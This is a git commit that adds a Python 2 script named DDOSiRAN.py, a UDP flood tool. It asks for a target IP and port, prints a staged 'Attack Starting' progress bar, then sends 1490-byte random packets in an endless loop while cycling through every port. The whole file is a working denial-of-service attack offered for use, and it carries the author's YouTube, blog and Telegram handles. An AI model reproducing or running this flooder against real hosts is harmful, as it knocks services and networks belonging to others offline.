a075e1f46ff20689aa9d532c3fb2b2807b9f5c03
yenyangmjaze112281 <123990441+yenyangmjaze112281@users.noreply.github.com>
2023-02-17 03:30:41 +0330

    Add files via upload

---
+++ DDOSiRAN.py
@@ -0,0 +1,50 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet iran13891389")
+print
+print "Author   : iran13891389"
+print "You Tube : https://youtube.com/@user-hf5ww9ys2n"
+print "blog   : http://iran13891389.blogfa.com"
+print "Telegram : @iran13891389"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
